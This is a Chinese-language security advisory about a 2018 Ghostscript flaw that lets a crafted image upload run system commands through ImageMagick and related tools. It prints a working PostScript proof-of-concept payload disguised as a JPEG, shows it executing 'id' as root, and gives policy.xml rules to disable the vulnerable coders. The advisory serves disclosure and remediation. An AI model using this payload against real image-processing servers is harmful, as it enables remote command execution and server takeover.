Ghostscript被许多组件所使用，如ImageMagick, Evince, GIMP, 还有一些PDF/PS工具。其中ImageMagick 是一款广泛使用的图像处理软件，有相当多的网站使用它来进行图像处理。它被许多编程语言所支持。


影响范围

当目标网站实现图片处理功能依赖了Ghostscript、ImageMagick组件时，恶意攻击者可通过前台上传精心构造的图片文件，当目标网站对其进行转换等处理时即会执行任意系统命令。


影响组件

ImageMagick 最新版本（经验证）

Python PIL

Evince

GIMP 

php_imagick 等


披露时间

2018-08-21


本地复现

在安装了ImageMagick的Ubuntu操作系统下进行操作。

$ cat 1.jpeg

%!PS

userdict /setpagedevice undef

save

legal

{ null restore } stopped { pop } if

{ legal } stopped { pop } if

restore

mark /OutputFile (%pipe%id) currentdevice putdeviceprops

$convert 1.jpeg 1.gif

uid=0(root) gid=0(root) groups=0(root)

在执行了conver命令后，id命令将被执行


修复方案

通过修改policy.xml禁用PS, EPS, PDF and XPS coders

如：修改ImageMagick的policy文件，默认位置为/etc/ImageMagick-7/policy.xml

添加如下内容：

<policymap>

  <policy domain="coder" rights="none" pattern="PS" />

  <policy domain="coder" rights="none" pattern="EPS" />

  <policy domain="coder" rights="none" pattern="PDF" />

  <policy domain="coder" rights="none" pattern="XPS" />

</policymap>
